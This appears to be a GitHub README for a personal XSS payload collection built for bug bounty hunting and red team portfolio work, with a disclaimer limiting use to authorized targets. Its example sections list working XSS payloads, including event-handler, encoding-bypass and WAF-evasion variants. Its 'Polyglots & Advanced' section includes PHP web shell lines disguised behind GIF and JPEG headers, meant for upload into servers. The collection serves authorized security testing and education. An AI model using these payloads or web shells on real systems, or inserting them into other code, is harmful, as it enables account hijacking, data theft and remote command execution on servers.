# XSS Payload Collection for Ethical Research & Education


**Author:** [Arman/v1p3er]  
**Focus:** Ethical Hacking | Bug Bounty | Red Team Preparation  
**Last Updated:** December 2025  

## 🚨 Important Disclaimer
**This repository is for educational and authorized security research purposes ONLY.**  
All payloads were collected during legitimate bug bounty engagements on programs that explicitly allow testing.  
**Never use these on systems without explicit permission.** Unauthorized testing is illegal.  
Always follow responsible disclosure and platform rules (e.g., HackerOne, Bugcrowd).

This collection demonstrates real-world XSS bypass techniques I encountered while hunting vulnerabilities. It showcases advanced evasion methods against WAFs, filters, and sanitizers – valuable for understanding defenses and preparing for red team roles.

## 📖 About This Collection
As an aspiring red teamer with experience in bug bounty programs, I compiled these XSS payloads from live targets (anonymized). They include:

- **Basic PoCs** (e.g., prompt/alert variations)
- **Event handlers** (onerror, onload, onmouseover)
- **Encoding bypasses** (hex, unicode, null bytes)
- **WAF evasions** (Cloudflare/Akamai-style filters)
- **Polyglots & advanced chains** (SVG, data URIs, expressions)

**Total Payloads:** 300+ unique entries  
**Sources:** Personal findings + public references (credited where possible)  
**Goal:** Build a strong portfolio for red team interviews while contributing to the community.

## 🛡️ Why This Matters for Red Team Careers
- Demonstrates **practical offensive security skills**
- Shows understanding of **filter evasion & chaining**
- Highlights **ethical mindset** (research-only)
- Useful for **labs, CTFs, and authorized pentests**

Inspired by repositories like:
- [payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [RenwaX23/XSS-Payloads](https://github.com/RenwaX23/XSS-Payloads)

## 📂 Repository Structure
```
/
├── payloads/
│   ├── basic.txt              # Simple alert/prompt
│   ├── event-handlers.txt     # onerror, onload, etc.
│   ├── encoding-bypass.txt    # Hex, Unicode, null bytes
│   ├── waf-evasion.txt        # Cloudflare/Akamai tricks
│   ├── polyglots.txt          # Multi-context payloads
│   └── advanced-chains.txt    # DOM-based, SVG, etc.
├── README.md                  # This file
├── CONTRIBUTING.md            # How to contribute
```

**All payloads are in plain text files for easy loading into tools like Burp Intruder or XSStrike.**

## 🔍 Categories & Examples
Here are highlights (full list in `/payloads/`):

### Basic & Prompt Variations
```
"-prompt(8)-"
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
```

### Event Handlers & Tags
```
<img src=x onerror=prompt(8)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<body onscroll=alert(1)><br><br>...<input autofocus>
```

### Encoding & Obfuscation
```
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<script\x20type="text/javascript">javascript:alert(1);</script>
<a href="javas&#x09;cript:javascript:alert(1)">
```

### WAF Bypass Techniques
```
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<style/onload=<!---->&#10;alert&#10;(1)>
```

### Polyglots & Advanced
```
GIF89a; <?php system($_GET['cmd']); ?>
ÿØÿàJFIF<?php system($_GET['cmd']); ?>
<data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
```

## 🛠️ Usage Recommendations
- **Tools:** Burp Suite Intruder, XSStrike, dalfox
- **Testing:** Only on authorized targets (e.g., HackTheBox, PortSwigger Labs, your own apps)
- **Learning:** Pair with OWASP XSS Prevention Cheat Sheet

## 🤝 Contributing
Found a new bypass? Submit a Pull Request!  
- Add to appropriate file
- Include context (e.g., "Bypasses Cloudflare regex")
- Keep ethical – no live target details
- 
---

**Stars appreciated if this helps your red team journey!** ⭐  


**Happy (ethical) hunting!** 🛡️
